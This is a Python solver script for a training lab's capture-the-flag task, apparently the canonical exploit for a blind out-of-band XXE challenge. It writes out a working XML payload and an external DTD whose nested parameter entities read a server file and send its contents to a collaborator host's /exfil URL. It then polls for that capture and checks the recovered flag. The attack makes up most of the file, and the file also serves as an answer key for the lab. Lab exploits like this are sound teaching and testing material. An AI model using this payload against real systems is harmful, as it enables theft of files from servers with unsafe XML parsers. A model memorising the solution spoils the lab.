#!/usr/bin/env python3
# solvers/p5_5.py, Task 5.5 "The Silent Courier" canonical exploit.
#
# challenges/phase5.py's p5_courier() route parses a caller-supplied XML
# document with the same unsafe parser configuration as p5_4 (load_dtd=True,
# resolve_entities=True, no_network=False), but its HTTP response is always a
# fixed "dispatch confirmed" message — no element text, no entity-resolution
# result, nothing data-dependent is ever reflected back. The in-band channel
# that made p5_4's file-read possible (the route echoing <document>.text
# directly in its response) is closed. This is blind OOB XXE.
#
# The external DTD + nested parameter entity chain is the exfil mechanism:
#
#   Payload sent to /p5/courier:
#     <!DOCTYPE courier [
#       <!ENTITY % remote SYSTEM "http://collaborator/evil.dtd?f=/opt/king/dispatch.txt">
#       %remote;
#     ]>
#
#   The parser fetches the external DTD from collaborator (see
#   collaborator/collaborator.py's _serve_evil_dtd). That DTD contains:
#     <!ENTITY % file SYSTEM "file:///opt/king/dispatch.txt">
#     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://collaborator/exfil?d=%file;'>">
#     %eval;
#     %exfil;
#
#   Step by step:
#     %file; => reads /opt/king/dispatch.txt ("SEIYAKU{entity_phoned_home}")
#     %eval; => expands to define %exfil; with %file;'s value in the URL
#     %exfil; => fires GET http://collaborator/exfil?d=SEIYAKU{entity_phoned_home}
#
#   The collaborator logs that /exfil request as a normal HTTP capture.
#   This script polls /p5/courier/captures and reads the flag off that entry.
#
# Why &#x25; instead of % in the eval entity value: a literal % inside a
# quoted parameter-entity value is disallowed in internal DTD subsets by the
# XML spec. Character-entity encoding it (%  = &#x25;) works because this
# content is served as an *external* DTD, re-parsed in a context that allows
# nested parameter-entity declarations (see learn-xml-injection.md §5.4).

import json
import os
import sys
import time
import urllib.parse
import urllib.request

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
ROUTE = f"{BASE}/p5/courier"
CAPTURES_ROUTE = f"{BASE}/p5/courier/captures"
EXPECTED_FLAG = "SEIYAKU{entity_phoned_home}"

# The blind OOB XXE payload. The external-entity reference %remote; causes
# the parser to fetch the external DTD from the collaborator service, which
# then carries out the file-read and exfil chain server-side, with no data
# ever returning to this route's own HTTP response.
PAYLOAD = """\
<?xml version="1.0"?>
<!DOCTYPE courier [
  <!ENTITY % remote SYSTEM "http://collaborator/evil.dtd?f=/opt/king/dispatch.txt">
  %remote;
]>
<courier><mission>ping</mission></courier>"""


def _post_payload() -> dict:
    data = urllib.parse.urlencode({"xml": PAYLOAD}).encode("utf-8")
    req = urllib.request.Request(
        ROUTE, data=data, method="POST",
        headers={"Accept": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _poll_captures(retries: int = 12, delay: float = 0.5) -> str | None:
    """Poll /p5/courier/captures until an /exfil entry with a `d` param
    appears, or the retry window expires."""
    for _ in range(retries):
        req = urllib.request.Request(CAPTURES_ROUTE)
        with urllib.request.urlopen(req, timeout=5) as resp:
            captures = json.loads(resp.read().decode("utf-8"))
        for c in captures:
            if c.get("type") == "http" and c.get("path") == "/exfil":
                vals = (c.get("query") or {}).get("d") or []
                if vals:
                    return vals[0]
        time.sleep(delay)
    return None


def main() -> int:
    print(f"[p5_5] target: {ROUTE}")

    # --- Step 1: send the OOB XXE payload ---------------------------------
    print("[p5_5] step 1: send OOB XXE payload")
    result = _post_payload()
    if result.get("error"):
        print(f"[p5_5] FAIL: courier desk returned error: {result['error']}")
        return 1
    if not result.get("dispatched"):
        print("[p5_5] FAIL: dispatch was not confirmed (expected dispatched=true)")
        return 1
    print("  ok: dispatch confirmed — no flag in response (the desk never echoes)")
    print("      the flag left via a different channel; polling captures now")

    # --- Step 2: poll captures for the exfil hit --------------------------
    print("[p5_5] step 2: poll /p5/courier/captures for /exfil entry")
    flag = _poll_captures()
    if not flag:
        print("[p5_5] FAIL: no /exfil capture appeared within retry window")
        print("             check that the collaborator container is running")
        return 1
    print(f"  ok: /exfil hit captured: d={flag!r}")

    # --- Step 3: verify the flag ------------------------------------------
    print(f"[p5_5] recovered flag: {flag}")
    if flag == EXPECTED_FLAG:
        print(f"  ok: recovered flag matches: {flag}")
    else:
        print(f"[p5_5] FAIL: recovered {flag!r}, expected {EXPECTED_FLAG!r}")
        return 1

    print("[p5_5] ok: blind OOB XXE via external DTD + collaborator exfil channel")
    print("[p5_5] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
